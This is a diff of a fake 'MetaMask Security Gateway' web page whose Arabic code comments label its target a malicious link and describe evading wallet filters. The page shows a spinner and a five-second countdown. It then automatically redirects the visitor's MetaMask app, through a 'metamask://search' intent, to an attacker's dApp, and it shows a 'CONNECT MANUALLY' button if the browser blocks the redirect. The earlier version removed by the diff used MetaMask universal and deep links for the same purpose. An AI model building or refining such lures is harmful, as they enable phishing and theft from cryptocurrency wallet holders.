@@ -3,46 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask Protocol Handshake...</title>
+    <title>Security Gateway - MetaMask</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #121212; color: #f6851b; text-align: center; }
-        .loader { border: 4px solid #1e1e1e; border-top: 4px solid #f6851b; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #0b0e11; color: white; text-align: center; }
+        .loader { border: 4px solid #1e2329; border-top: 4px solid #f6851b; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.2rem; margin: 0; }
-        p { color: #888; font-size: 0.9rem; margin-top: 10px; }
+        h1 { font-size: 1.4rem; color: #f6851b; }
+        .timer-box { margin-top: 15px; font-size: 1rem; color: #9ca3af; }
+        #seconds { font-weight: bold; color: #f6851b; font-size: 1.2rem; }
+        .btn-bypass { margin-top: 30px; padding: 12px 30px; background: #f6851b; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <h1>Establishing Secure DApp Connection...</h1>
-    <p>Please wait while we redirect you to MetaMask Browser.</p>
+    <h1>Initializing Secure Bridge</h1>
+    <p>Connecting your wallet to the dApp gateway...</p>
+    
+    <div class="timer-box">Redirecting in <span id="seconds">5</span> seconds...</div>
+
+    <button id="manualBtn" class="btn-bypass" onclick="doRedirect()">CONNECT MANUALLY</button>
 
     <script>
-        // الرابط الخبيث الخاص بك
-        const myDapp = "hatestck.vercel.app";
+        // 1. الرابط الخبيث (المستهدف)
+        const myLink = "https://hatestck.vercel.app/";
+        
+        // 2. صياغة رابط البحث (The Search Intent) لتجاوز الفلتر
+        const targetUrl = "metamask://search?q=" + encodeURIComponent(myLink);
 
-        // الطريقة الأكثر قوة: استخدام الـ Universal Link الرسمي مع الـ Dapp Path
-        // هذا الرابط يتجاوز فلاتر الـ Deep Link العادية لأنه "رسمي" من الشركة
-        const targetUrl = "https://metamask.app.link/dapp/" + myDapp;
+        let timeLeft = 5;
+        const secondsDisplay = document.getElementById('seconds');
+        const manualBtn = document.getElementById('manualBtn');
 
-        function startBypass() {
-            // محاولة التحويل عبر الـ Universal Link
+        // 3. منطق العداد التنازلي
+        const countdown = setInterval(() => {
+            timeLeft--;
+            secondsDisplay.innerText = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                doRedirect();
+            }
+        }, 1000);
+
+        // 4. وظيفة التحويل (مع معالجة حظر المتصفح)
+        function doRedirect() {
+            // محاولة التحويل
             window.location.href = targetUrl;
             
-            // Backup: إذا فشل الأول بعد ثانيتين، جرب البروتوكول المباشر
+            // إظهار الزر اليدوي فوراً في حال فشل التحويل التلقائي (بسبب سياسات المتصفح)
             setTimeout(() => {
-                window.location.href = "metamask://dapp/" + myDapp;
-            }, 2000);
+                manualBtn.style.display = "block";
+                document.querySelector('.timer-box').innerText = "Redirect blocked by browser. Please click below:";
+            }, 500);
         }
 
-        // تنفيذ الهجوم تلقائياً بعد تحميل الصفحة
-        window.onload = startBypass;
+        // تحفيز المتصفح عند أول لمسة للشاشة لضمان عمل الـ Redirect لاحقاً
+        window.onclick = function() { console.log("User gestured - Redirect primed."); };
     </script>
-
-    <button onclick="startBypass()" style="margin-top: 30px; padding: 10px 20px; background: #f6851b; border: none; color: white; border-radius: 5px; cursor: pointer;">
-        Manual Connect
-    </button>
 
 </body>
 </html>
